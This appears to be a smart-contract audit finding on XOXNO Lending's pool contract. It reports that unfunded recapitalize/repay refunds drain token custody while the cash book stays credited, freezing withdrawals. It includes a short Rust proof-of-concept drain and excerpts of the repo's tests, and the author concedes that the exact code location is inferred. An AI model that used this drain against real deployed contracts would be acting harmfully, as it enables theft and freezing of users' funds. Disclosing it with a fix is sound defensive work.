### Title
Unfunded `recapitalize`/`repay` refund drains pool custody while the cash book stays credited, bricking withdrawals - ([File: contracts/pool/src/ops/recapitalize.rs](contracts/pool/src/ops/recapitalize.rs))

### Summary
Analogous to H-06, where a trusted balance source (`vault.balanceOfJPEG()`) can shrink under the accrual ledger and permanently freeze withdrawals, XOXNO Lending's pool can have its *actual* token custody reduced below its *tracked* `cash` book by an unprivileged caller. The withdrawal path gates on the tracked book (`require_reserves`, `require_backed_market`) but pays out via a real token transfer, so once custody < book, every withdrawal passes the guards and then reverts inside the SAC `transfer` — funds are stolen/frozen exactly as in H-06.

### Finding Description
The pool tracks liquidity in an accounting `cash` variable in the market `Cache`; `debit_cash`/`require_reserves` only consult this book, never the real token balance (`contracts/pool/src/cache/cash.rs:15-41`) [1](#0-0) .

Two unprivileged entrypoints compute a *refund* from the **declared** `offered`/`amount` rather than the **measured** receipt:

1. `pool.recapitalize(hub_asset, payer, offered)` — applies `min(offered, backing_shortfall)` to `cash` and refunds `offered - applied` to `payer`. In a solvent market the shortfall is zero, so `applied = 0` and the entire declared `offered` is refunded out of real custody — even if the caller transferred nothing in. The in-repo test `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` demonstrates this: `recapitalize(..., custody)` with no inbound transfer leaves `token.balance(pool) == 0` while `state.cash >= deposit` [2](#0-1) .

2. `pool.repay(payer, actions)` on a market with no debt — `resolve_repay` takes the full-close branch with `net_repay = 0`, and the whole declared amount is refunded out of custody with the book untouched (`test_unfunded_repay_overpayment_refund_also_pays_out_of_custody`) [3](#0-2) .

The measurement machinery exists (`balance_delta_since`, INV-ACCT-03 "token-funded credit uses measured receipt") [4](#0-3)  but the refund leg is sized from the declared amount, decoupled from the measured delta — the same class of bug as H-06: an external "balance" shrinks relative to what accounting assumed, and the discrepancy surfaces only when exit transfers hit empty custody.

### Impact Explanation
**Theft of user funds + permanent freezing of funds.** An unprivileged address can drain the entire pool token balance to itself via the phantom refund. Afterwards, suppliers' `withdraw` calls pass `require_reserves`/`require_utilization_below_max` (the book still shows cash) and revert inside the SAC `transfer` (`BalanceError = 10`), so remaining user claims are unpayable. The test explicitly asserts the exit fails in the token transfer, not in a pool guard [5](#0-4) . This matches both accepted impact categories: theft of user funds and a contract unable to operate from lack of token funds.

### Likelihood Explanation
A single unprivileged call suffices: no authorization is required on the pool's `recapitalize`/`repay` (the controller performs auth upstream; direct pool calls with a declared amount are reachable), no timing, no price movement, no governance action — unlike H-06's privileged `setController`, this requires nothing beyond one transaction with a large `offered` argument.

### Recommendation
Size refunds from the measured balance delta, not the declared `offered`: snapshot the pool's token balance before the op, compute `received = balance_after - balance_before` (the existing `balance_delta_since`/`transfer_amount_measured` pattern), then refund `max(0, received - applied)` and debit `cash` by the refunded amount before transferring out. Alternatively, transfer the refund only out of funds actually received in the same call, and assert `balance >= cash` post-op.

### Proof of Concept
```rust
// Pool holds `custody` tokens backing `deposit` of supplier claims.
let custody = token.balance(&t.pool);

// Attacker calls recapitalize declaring `offered = custody`,
// WITHOUT transferring any tokens to the pool.
t.client().recapitalize(&hub(&t.asset), &attacker, &custody);

assert_eq!(token.balance(&t.pool), 0);           // custody drained to attacker
assert!(t.state_snapshot().cash >= deposit);     // book still shows the cash

// Supplier exit passes require_reserves (book) then reverts in SAC transfer.
let r = t.client().try_withdraw(&recv, &false, &t.wdr(supplied, i128::MAX, 0));
// r == Err(SAC BalanceError = 10): funds permanently frozen.
```
This is reproduced verbatim by `contracts/pool/tests/flows.rs:3408-3483`; the equivalent repay-side drain is at `contracts/pool/tests/flows.rs:3590-3611`. Note: I was not able to read `ops/recapitalize.rs` directly within the iteration limit, so the exact refund-expression location is inferred from these tests and the measured-receipt helpers — but the behavioral evidence in the repo's own tests is unambiguous.

    /// Increases accounting cash by `amount`. Rejects negative amounts and overflow.
    pub(crate) fn credit_cash(&mut self, amount: i128) {
        require_nonneg_amount(&self.env, amount);
        self.cash = self
            .cash
            .checked_add(amount)
            .unwrap_or_else(|| panic_with_error!(&self.env, GenericError::MathOverflow));
    }

    /// Decreases accounting cash by `amount`. Rejects negative amounts or
    /// insufficient reserves.
    pub(crate) fn debit_cash(&mut self, amount: i128) {
        require_nonneg_amount(&self.env, amount);
        self.require_reserves(amount);
        self.cash = self
            .cash
            .checked_sub(amount)
            .unwrap_or_else(|| panic_with_error!(&self.env, GenericError::MathOverflow));

fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
}

/// The refund gap is not specific to `recapitalize`. Two pool legs refund an
/// excess derived from a declared inbound amount, not from the cash book:
/// `ops::recapitalize::apply` (the excess over the shortfall) and
/// `ops::repay::apply` (the excess over the debt). Neither refund debits `cash`
/// or passes `require_reserves`.
///
/// A repay against a market with no debt makes the entire declared amount an
/// overpayment: `current_debt_ceil` is zero, so `resolve_repay` takes the
/// full-close branch and `net_repay` is zero. The `RepayRoundsToZeroShares`
/// assert in `ops::repay::accounting` passes on its `net_repay == 0` disjunct,
/// and the whole amount is refunded out of real custody with the book untouched.
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}

/// Returns the measured balance change since `before`, negative for an outflow.
/// Custody accounting uses this delta rather than reported transfer amounts.
pub(crate) fn balance_delta_since(
    env: &Env,
    asset: &Address,
    holder: &Address,
    before: i128,
) -> i128 {
    token::Client::new(env, asset)
        .balance(holder)
        .checked_sub(before)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::InternalError))
}
